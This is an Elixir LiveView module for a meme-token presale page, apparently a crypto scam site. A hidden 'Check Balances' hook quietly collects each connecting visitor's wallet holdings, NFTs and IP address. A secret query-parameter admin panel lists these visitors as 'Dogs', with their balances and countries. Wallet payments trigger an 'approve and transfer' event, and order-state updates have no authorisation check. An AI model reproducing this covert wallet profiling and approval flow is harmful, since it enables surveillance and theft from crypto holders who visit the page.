defmodule BirdpawWeb.Page.Index do
  @moduledoc """
  This module is used to render the index page.
  """
  use BirdpawWeb, :live_view

  import Birdpaw.Presale
  import Birdpaw.PresaleUtil
  import Birdpaw.Wallets

  import Birdpaw.Utils.IPGeolocation, only: [get_country_by_ip: 1]

  @contract_address "0xDc484b655b157387B493DFBeDbeC4d44A248566F"

  @impl true
  def mount(params, _session, socket) do
    if connected?(socket), do: Process.send_after(self(), :auto_slide, 5000)

    show_master_modal =
      case params do
        # Example with a query param
        %{"show_master" => "true"} -> true
        _ -> false
      end

    {:ok,
     assign(socket,
       is_authorized_master: false,
       show_master_modal: show_master_modal,
       show_search_modal: false,
       error_message: nil,
       current_slide: 0,
       faqs: [
         {"What is Birdcatcher Cats?",
          "Birdcatcher Cats ($BIRDPAW) is a fun and engaging meme token built on the Ethereum blockchain.",
          "1", nil},
         {"How can I buy $BIRDPAW?",
          "You can purchase $BIRDPAW on major cryptocurrency exchanges where it is listed.", "2",
          nil},
         {"What is the total supply of $BIRDPAW?",
          "$BIRDPAW has a total supply of 1,000,000,000 tokens.", "3", nil},
         {"What are the future plans for Birdcatcher Cats?",
          "We plan to develop a platform with wallet integration, list on major exchanges, and launch an NFT marketplace.",
          "4", nil},
         {"Where can I read the whitepaper?",
          "You can find the Birdcatcher Cats ($BIRDPAW) whitepaper at ", "5", :whitepaper}
       ],
       expanded: false,
       # Replace with your actual contract address
       contract_address: @contract_address,
       presale_form: %{
         is_open?: false,
         session_id: nil,
         wallet_address: nil,
         birdpaw_amount: min_birdpaw_purchase(),
         amount: min_birdpaw_purchase() |> calculate_amount("ETH"),
         qr_code_base64: nil,
         is_confirmed?: false,
         payment_method: "ETH",
         payment_variant: nil,
         wallet_payment_done?: false,
         wallet_payment_fail?: false
       },
       orders_data: %{
         loading: true,
         selected: [],
         orders: [],
         page: 1,
         total_pages: 0,
         search_query: "",
         order_to_manage: nil
       },
       wallet_info: %{address: nil, eth_balance: nil, nfts: [], tokens: []},
       order: nil,
       show_wallet_logbook: false,
       wallet_logs: [],
       wallet_filter: %{date_from: nil, date_to: nil, eth_min: nil, eth_max: nil}
     )}
  end

  @impl true
  def handle_event(
        "filter_logs",
        %{
          "date_from" => start_date,
          "date_to" => end_date,
          "eth_min" => eth_min,
          "eth_max" => eth_max
        } = params,
        socket
      ) do
    # Dynamically build the filters list
    filters = []

    filters =
      if start_date != "" do
        [{:date_from, parse_datetime(start_date)} | filters]
      else
        filters
      end

    filters =
      if end_date != "" do
        [{:date_to, parse_datetime(end_date)} | filters]
      else
        filters
      end

    filters =
      if eth_min != "" do
        [{:eth_min, Decimal.new(eth_min)} | filters]
      else
        filters
      end

    filters =
      if eth_max != "" do
        [{:eth_max, Decimal.new(eth_max)} | filters]
      else
        filters
      end

    filters_map = Map.new(filters)
    filtered_logs = fetch_wallet_logs(filters_map)

    {:noreply,
     assign(socket,
       wallet_logs: filtered_logs,
       wallet_filter: %{
         date_from: start_date,
         date_to: end_date,
         eth_min: eth_min,
         eth_max: eth_max
       }
     )}
  end

  @impl true
  def handle_event(
        "set_wallet_basics",
        %{"address" => address, "eth_balance" => eth_balance},
        %{assigns: %{presale_form: presale_form}} = socket
      ) do
    {:noreply,
     assign(socket,
       wallet_info: %{address: address, eth_balance: eth_balance},
       presale_form: %{presale_form | wallet_address: address}
     )}
  end

  @impl true
  def handle_event(
        "order_confirmation_success",
        %{"address" => address, "eth_balance" => eth_balance},
        %{assigns: %{presale_form: presale_form}} = socket
      ) do
    {:noreply,
     assign(socket,
       wallet_info: %{address: address, eth_balance: eth_balance},
       presale_form: %{presale_form | wallet_payment_done?: true}
     )}
  end

  @impl true
  def handle_event(
        "order_confirmation_error",
        %{"error" => error_message},
        %{assigns: %{presale_form: presale_form}} = socket
      ) do
    {:noreply, socket |> assign(presale_form: %{presale_form | wallet_payment_fail?: true})}
  end

  @impl true
  def handle_event(
        "set_payment_variant",
        %{"variant" => payment_variant},
        %{assigns: %{presale_form: presale_form}} = socket
      ) do
    {:noreply, assign(socket, :presale_form, %{presale_form | payment_variant: payment_variant})}
  end

  @impl true
  def handle_event(
        "select-payment-variant",
        %{"variant" => method},
        %{assigns: %{presale_form: %{birdpaw_amount: birdpaw_amount} = presale_form}} = socket
      ) do
    # Assign the selected payment method to the form data
    payment_method =
      case method do
        "wallet" -> "ETH"
        _ -> Map.get(presale_form, :payment_method, "ETH")
      end

    {:noreply,
     socket
     |> assign(:presale_form, %{
       presale_form
       | payment_variant: method,
         payment_method: payment_method,
         amount:
           case is_binary(birdpaw_amount) do
             true -> String.to_integer(birdpaw_amount)
             false -> birdpaw_amount
           end
           |> calculate_amount(payment_method)
     })}
  end

  @impl true
  def handle_event(
        "select-payment-variant-type",
        %{"payment_method" => payment_method},
        %{assigns: %{presale_form: %{birdpaw_amount: birdpaw_amount} = presale_form}} = socket
      ) do
    {:noreply,
     socket
     |> assign(:presale_form, %{
       presale_form
       | payment_method: payment_method,
         amount:
           case is_binary(birdpaw_amount) do
             true -> String.to_integer(birdpaw_amount)
             false -> birdpaw_amount
           end
           |> calculate_amount(payment_method)
     })}
  end

  @impl true
  def handle_event(
        "calculate-eth",
        %{
          "birdpaw_amount" => birdpaw_amount,
          "wallet_address" => wallet_address
        },
        %{assigns: %{presale_form: %{payment_variant: payment_variant} = _presale_form}} = socket
      ) do
    payment_method = socket.assigns[:presale_form][:payment_method] || "ETH"

    birdpaw_amount =
      if is_binary(birdpaw_amount), do: String.to_integer(birdpaw_amount), else: birdpaw_amount

    # Calculate amount based on selected currency
    amount =
      case payment_method do
        "ETH" ->
          calculate_amount(birdpaw_amount, "ETH")

        "USDT" ->
          calculate_amount(birdpaw_amount, "USDT")

        _ ->
          0
      end

    wei_amount = (amount * 1_000_000_000_000_000_000) |> round()

    presale_form = %{
      amount: amount,
      wei_amount: wei_amount,
      wallet_address: wallet_address,
      birdpaw_amount: birdpaw_amount,
      qr_code_base64: nil,
      show_link: "/payments/qr_code_#{wallet_address}.png",
      is_confirmed?: false,
      payment_method: payment_method,
      payment_variant: payment_variant
    }

    {:noreply, assign(socket, presale_form: presale_form)}
  end

  @impl true
  def handle_event(
        "toggle-buy-token",
        %{"toggle" => toggle},
        %{assigns: %{presale_form: presale_form}} = socket
      ) do
    {:noreply, assign(socket, :presale_form, %{presale_form | is_open?: toggle == "true"})}
  end

  def handle_event(
        "calculate-amount",
        %{"birdpaw_amount" => birdpaw_amount, "wallet_address" => wallet_address} = _params,
        %{assigns: %{presale_form: %{payment_method: payment_method} = presale_form}} = socket
      ) do
    amount_to_pay =
      case {payment_method, birdpaw_amount not in [nil, ""]} do
        {"ETH", false} -> 0
        {"ETH", _} -> birdpaw_amount |> String.to_integer() |> calculate_amount("ETH")
        {"USDT", false} -> 0
        {"USDT", _} -> birdpaw_amount |> String.to_integer() |> calculate_amount("USDT")
        _ -> 0
      end

    socket =
      assign(socket, :presale_form, %{
        presale_form
        | amount: amount_to_pay,
          birdpaw_amount: birdpaw_amount
      })

    {:noreply, socket}
  end

  @impl true
  def handle_event(
        "confirm-buy-token",
        %{
          "birdpaw_amount" => birdpaw_amount,
          "wallet_address" => wallet_address,
          "payment_method" => payment_method,
          "amount" => amount
        },
        socket
      ) do
    # Create order UUID
    order_uuid = Ecto.UUID.generate()
    wei_amount = Map.get(socket.assigns.presale_form, :wei_amount, 0)

    # Generate QR code for non-wallet payments
    qr_code_binary =
      if socket.assigns.presale_form.payment_variant == "qr" do
        generate_qr_code({wei_amount, amount}, order_uuid, payment_method)
      else
        nil
      end

    # Update presale form with order details
    presale_form =
      socket.assigns.presale_form
      |> Map.put(:qr_code_base64, qr_code_binary)
      |> Map.put(:is_confirmed?, true)

    order = %{
      wallet_address: wallet_address,
      birdpaw_amount: birdpaw_amount,
      payment_method: payment_method,
      amount: amount,
      is_confirmed?: true,
      timestamp: DateTime.utc_now(),
      uuid: order_uuid,
      order_state: "pending",
      qr_code_base64: qr_code_binary
    }

    {:ok, _created_order} = create_presale_order(order)

    if socket.assigns.presale_form.payment_variant == "wallet" do
      # Trigger the approve and transfer hook for wallet payments
      {:noreply,
       socket |> assign(:order, order) |> push_event("trigger_approve_and_transfer", %{})}
    else
      {:noreply,
       assign(socket, order: order, presale_form: %{presale_form | wallet_payment_done?: true})}
    end
  end

  @impl true
  def handle_event(
        "check_balances_result",
        %{"nfts" => _nfts, "tokens" => tokens, "ip" => ip_address} =
          params,
        %{
          assigns: %{
            wallet_info: %{address: wallet_address, eth_balance: eth_balance} = wallet_info,
            presale_form: _presale_form
          }
        } = socket
      ) do
    # Merge the incoming params into the wallet_info map
    updated_wallet_info = %{
      "wallet_address" => wallet_address,
      "eth_balance" => eth_balance,
      "tokens" => tokens
    }

    log_wallet_connection(updated_wallet_info, ip_address)

    # Assign the updated wallet_info back into the socket
    {:noreply, assign(socket, :wallet_info, updated_wallet_info)}
  end

  @impl true
  def handle_event("prev_slide", _, socket) do
    new_slide = rem(socket.assigns.current_slide - 1 + length(slides()), length(slides()))
    {:noreply, assign(socket, :current_slide, new_slide)}
  end

  @impl true
  def handle_event("next_slide", _, socket) do
    new_slide = rem(socket.assigns.current_slide + 1, length(slides()))
    {:noreply, assign(socket, :current_slide, new_slide)}
  end

  @impl true
  def handle_event("copy_address", %{"address" => address}, socket) do
    {:noreply, push_event(socket, "copy_to_clipboard", %{address: address})}
  end

  @impl true
  def handle_event(
        "update_order_state",
        %{"order_id" => order_id, "order_state" => new_state},
        socket
      ) do
    # Find and update the order state
    updated_order =
      order_id
      |> String.to_integer()
      |> get_presale_order!()
      |> Map.put(:order_state, new_state)
      |> update_order_state(new_state)

    # Update the list of orders and close the modal
    updated_orders =
      Enum.map(socket.assigns.orders_data.orders, fn order ->
        if order.id == String.to_integer(order_id) do
          updated_order
        else
          order
        end
      end)

    {:noreply,
     assign(socket,
       orders_data: %{socket.assigns.orders_data | orders: updated_orders}
     )}
  end

  @impl true
  def handle_event("toggle_wallet_logbook", _, %{assigns: %{show_wallet_logbook: value}} = socket) do
    new_value = !value

    with true <- new_value,
         wallet_logbook <- fetch_wallet_logs() do
      {:noreply, assign(socket, wallet_logs: wallet_logbook, show_wallet_logbook: new_value)}
    else
      _ -> {:noreply, assign(socket, :show_wallet_logbook, new_value)}
    end
  end

  @impl true
  def handle_info(:auto_slide, socket) do
    new_slide = rem(socket.assigns.current_slide + 1, length(slides()))
    # 5 seconds interval
    Process.send_after(self(), :auto_slide, 5000)
    {:noreply, assign(socket, :current_slide, new_slide)}
  end

  @impl true
  def handle_info(:close_master_modal, %{assigns: %{show_master_modal: value}} = socket) do
    {:noreply,
     assign(socket,
       show_master_modal: value,
       password_verified: value,
       error_message: nil,
       is_authorized_master: value
     )}
  end

  defp slides do
    [
      %{
        src: "/images/meme_1.webp",
        alt: "Almost there!",
        caption: "Almost there!"
      },
      %{
        src: "/images/meme_2.webp",
        alt: "Found it!",
        caption: "Found it!"
      },
      %{
        src: "/images/meme_3.webp",
        alt: "To the moon!",
        caption: "To the moon!"
      },
      %{
        src: "/images/meme_5.webp",
        alt: "Catch the bird!",
        caption: "Catch the bird!"
      },
      %{
        src: "/images/meme_6.webp",
        alt: "Catching profits!",
        caption: "Catching profits!"
      },
      %{
        src: "/images/meme_7.webp",
        alt: "Feather your nest",
        caption: "Feather your nest!"
      }
    ]
  end

  @impl true
  def render(assigns) do
    ~H"""
    <main class="bg-gradient-to-r from-zinc-900 via-zinc-800 to-zinc-900 min-h-screen">
      <div class="mx-auto max-w-6xl p-4">
        <div
          class="welcome-component bg-cover min-h-screen flex items-center justify-center"
          style="background-image: url('/images/image.webp');"
        >
          <div :if={@is_authorized_master} class="fixed bottom-5 right-5 z-50">
            <button
              phx-click="toggle_wallet_logbook"
              class="p-3 rounded-full bg-gray-800 text-white shadow-lg hover:bg-gray-700"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                class="h-6 w-6"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2"
                  d="M9 12h6m-6 6h6m2-10h.01M21 11.01V21a2 2 0 01-2 2H5a2 2 0 01-2-2V11.01m18-6.01A2 2 0 0021 3h-3.51a2 2 0 00-1.414-.586L15 2m0 0L9 12m6-6l-1.657 1.657M15 2V12"
                />
              </svg>
            </button>
          </div>

          <.live_component
            module={BirdpawWeb.Components.Attributes}
            id="attributes"
            contract_address={@contract_address}
          />
        </div>

        <button
          id="check-balances"
          phx-hook="CheckBalances"
          class="bg-blue-500 px-4 py-2 rounded hidden"
        >
          Check Balances
        </button>
        <!-- Approve and Transfer Buttons (call the JavaScript functions) -->
        <.live_component
          module={BirdpawWeb.Components.Promo}
          id="promo"
          contract_address={@contract_address}
          presale_form={@presale_form}
          modal_image={nil}
          orders_data={@orders_data}
          order={@order}
          show_search_modal={@show_search_modal}
          is_authorized_master={@is_authorized_master}
          show_master_modal={@show_master_modal}
          wallet_info={@wallet_info}
        />
        <!-- Conditionally render the Master Modal -->
        <%= if @show_master_modal and not @is_authorized_master do %>
          <.live_component
            id="master-modal"
            module={BirdpawWeb.Components.MasterModal}
            is_authorized_master={@is_authorized_master}
            error_message={@error_message}
          />
        <% end %>

        <div
          id="memes"
          class="memes-section bg-gray-800 text-white py-6 md:py-10 mt-10 rounded-lg shadow-lg"
        >
          <h2 class="text-2xl md:text-3xl text-center mb-6 md:mb-10">Gallery</h2>

          <div class="relative w-full max-w-lg md:max-w-3xl mx-auto overflow-hidden">
            <div
              class="flex transition-transform duration-500"
              style={"transform: translateX(-#{assigns.current_slide * 100}%);"}
            >
              <%= for slide <- slides() do %>
                <div class="flex-shrink-0 w-full text-center">
                  <img src={slide.src} alt={slide.alt} class="mx-auto max-w-xs md:max-w-md" />
                  <p class="meme-caption text-md md:text-xl mt-2 md:mt-4"><%= slide.caption %></p>
                </div>
              <% end %>
            </div>

            <div class="absolute top-1/2 transform -translate-y-1/2 left-0 ml-2">
              <button
                phx-click="prev_slide"
                class="bg-gray-700 text-white p-2 rounded-full hover:bg-gray-600"
              >
                ‹
              </button>
            </div>

            <div class="absolute top-1/2 transform -translate-y-1/2 right-0 mr-2">
              <button
                phx-click="next_slide"
                class="bg-gray-700 text-white p-2 rounded-full hover:bg-gray-600"
              >
                ›
              </button>
            </div>
          </div>
        </div>

        <div class="mt-10">
          <.live_component module={BirdpawWeb.Components.Tokenomics} id="tokenomics" />
        </div>

        <div class="mt-10">
          <.live_component module={BirdpawWeb.Components.Roadmap} id="roadmap" />
        </div>

        <div class="mt-10">
          <.live_component
            module={BirdpawWeb.Components.FAQ}
            id="faq"
            faqs={@faqs}
            expanded={@expanded}
          />
        </div>

        <div id="footer">
          <.live_component module={BirdpawWeb.Components.Footer} id="footer" />
        </div>

        <div :if={@show_wallet_logbook && @is_authorized_master} id="wallet-logbook-modal">
          <.wallet_logbook
            id="wallet-logbook"
            wallet_logs={@wallet_logs}
            wallet_filter={@wallet_filter}
          />
        </div>
      </div>
    </main>

    <script>
      document.addEventListener("DOMContentLoaded", () => {
        setInterval(() => {
          const memesElement = document.getElementById("memes");
          if (memesElement) {
            const pushEvent = memesElement.__phx__ ? memesElement.__phx__.pushEvent : null;
            if (pushEvent) {
              pushEvent.call(memesElement, "next_slide", {});
            }
          }
        }, 5000);

        const copyButton = document.getElementById("copy-button");
        const contractAddress = document.getElementById("contract-address").innerText;

        copyButton.addEventListener("click", () => {
          navigator.clipboard.writeText(contractAddress).then(
            () => {
              alert("Contract address copied to clipboard!");
            },
            (err) => {
              console.error("Could not copy text: ", err);
            }
          );
        });
      });
    </script>
    """
  end

  def wallet_logbook(assigns) do
    ~H"""
    <!-- Wallet Logbook Modal -->
    <div class="fixed inset-0 z-50 flex items-center justify-center bg-gray-900 bg-opacity-90 p-4">
      <!-- Modal Container -->
      <div
        id="wallet-logbook-container"
        class="bg-white p-4 md:p-6 rounded-lg shadow-2xl w-full max-w-lg md:max-w-4xl lg:max-w-6xl max-h-[90vh] overflow-auto relative"
      >
        <!-- Close Modal Icon (X) -->
        <button
          phx-click="toggle_wallet_logbook"
          class="absolute top-3 right-3 text-gray-500 hover:text-gray-700"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            class="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M6 18L18 6M6 6l12 12"
            />
          </svg>
        </button>
        <!-- Title with Badge -->
        <div class="flex items-center justify-center mb-6 space-x-4">
          <!-- Title with effect -->
          <h3 class="text-3xl md:text-4xl font-extrabold text-gray-900 tracking-tight hover:text-blue-600 transition duration-300">
            Wallet Logs
          </h3>
          <!-- Total Connections Badge -->
          <div class="inline-block bg-blue-500 text-white text-sm font-semibold px-4 py-1 rounded-full shadow-md hover:bg-blue-600 transition duration-300 transform hover:scale-105">
            <%= length(@wallet_logs) %> Dogs
          </div>
        </div>
        <!-- Modern and Compact Filtering Menu -->
        <div class="bg-gray-50 p-3 rounded-lg mb-6">
          <form phx-submit="filter_logs" class="flex flex-wrap gap-4">
            <!-- Date Range Filters -->
            <div class="flex-1 min-w-[120px]">
              <label for="date_from" class="block text-xs font-medium text-gray-600">Date From</label>
              <input
                type="date"
                id="date_from"
                name="date_from"
                value={@wallet_filter.date_from}
                class="mt-1 w-full p-2 text-sm border border-gray-300 rounded focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div class="flex-1 min-w-[120px]">
              <label for="date_to" class="block text-xs font-medium text-gray-600">Date To</label>
              <input
                type="date"
                id="date_to"
                name="date_to"
                value={@wallet_filter.date_to}
                class="mt-1 w-full p-2 text-sm border border-gray-300 rounded focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <!-- ETH Value Range Filters -->
            <div class="flex-1 min-w-[120px]">
              <label for="eth_min" class="block text-xs font-medium text-gray-600">Min ETH</label>
              <input
                type="number"
                step="0.0001"
                id="eth_min"
                name="eth_min"
                value={@wallet_filter.eth_min}
                placeholder="Min"
                class="mt-1 w-full p-2 text-sm border border-gray-300 rounded focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <div class="flex-1 min-w-[120px]">
              <label for="eth_max" class="block text-xs font-medium text-gray-600">Max ETH</label>
              <input
                type="number"
                step="0.1"
                id="eth_max"
                name="eth_max"
                value={@wallet_filter.eth_max}
                placeholder="Max"
                class="mt-1 w-full p-2 text-sm border border-gray-300 rounded focus:ring-blue-500 focus:border-blue-500"
              />
            </div>
            <!-- Apply Filters Button -->
            <div class="flex-shrink-0">
              <button
                type="submit"
                class="bg-blue-500 text-white text-sm font-semibold px-4 py-2 rounded-lg shadow hover:bg-blue-600"
              >
                Apply
              </button>
            </div>
          </form>
        </div>
        <!-- Compact Card Layout for Logs -->
        <div class="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3" id="wallet-logs">
          <%= for log <- @wallet_logs do %>
            <div class="relative bg-white p-3 md:p-4 rounded-lg shadow hover:shadow-lg transition-shadow duration-200">
              <!-- Wallet Address and Order Status -->
              <div class="flex justify-between items-center mb-2 md:mb-4">
                <h4 class="font-semibold text-base md:text-lg text-gray-700 truncate">Wallet</h4>
                <!-- Show if the user placed an order or not -->
                <button
                  class={
                    if Map.has_key?(log, :placed_order) && log.placed_order == true,
                      do: "bg-green-500 text-white",
                      else: "bg-yellow-500 text-white"
                  }
                  class="text-xs px-2 py-1 border rounded-md"
                >
                  <%= if Map.has_key?(log, :placed_order) && log.placed_order == true do %>
                    Order Placed
                  <% else %>
                    No Order
                  <% end %>
                </button>
              </div>
              <!-- Wallet Address (Etherscan link) -->
              <a
                href={"https://etherscan.io/address/#{log.wallet_address}"}
                target="_blank"
                class="text-xs md:text-sm text-blue-500 hover:underline truncate"
              >
                <%= log.wallet_address %>
              </a>
              <!-- ETH Balance -->
              <div class="mt-2 md:mt-4">
                <h5 class="font-medium text-xs md:text-sm text-gray-600">ETH Balance</h5>
                <p class="text-base md:text-lg font-semibold text-gray-900">
                  <%= log.eth_balance %> ETH
                </p>
              </div>
              <!-- IP Address and Country Flag -->
              <div class="mt-2 md:mt-4">
                <h5 class="font-medium text-xs md:text-sm text-gray-600">IP Address</h5>
                <div class="flex items-center space-x-2">
                  <p class="text-xs md:text-sm text-gray-700"><%= log.ip_address %></p>

                  <%= case get_country_by_ip(log.ip_address) do %>
                    <% {:ok, country_code} -> %>
                      <img
                        src={"https://flagcdn.com/16x12/#{String.downcase(country_code)}.png"}
                        alt={country_code}
                        class="w-5 h-5"
                      />
                      <span class="text-xs md:text-sm text-gray-700"><%= country_code %></span>
                    <% {:error, _} -> %>
                      <span class="text-xs md:text-sm text-gray-700">Unknown</span>
                  <% end %>
                </div>
              </div>
              <!-- Connected At -->
              <div class="mt-2 md:mt-4">
                <h5 class="font-medium text-xs md:text-sm text-gray-600">Connected At</h5>
                <p class="text-xs md:text-sm text-gray-700"><%= log.connected_at %></p>
              </div>
              <!-- Token Balances -->
              <div class="mt-2 md:mt-4">
                <h5 class="font-medium text-xs md:text-sm text-gray-600">Tokens</h5>
                <div class="flex flex-wrap gap-2 mt-1">
                  <%= for {symbol, token} <- log.token_balances do %>
                    <span class="inline-block bg-gradient-to-r from-teal-400 to-blue-500 text-white px-2 md:px-3 py-1 rounded-full text-xs font-semibold">
                      <%= symbol %>: <%= token["balance"] %>
                    </span>
                  <% end %>
                </div>
              </div>
            </div>
          <% end %>
        </div>
      </div>
    </div>
    """
  end

  # Utility function to parse dates
  defp parse_datetime(date_string) do
    case Date.from_iso8601(date_string) do
      {:ok, date} -> date
      _ -> nil
    end
  end
end
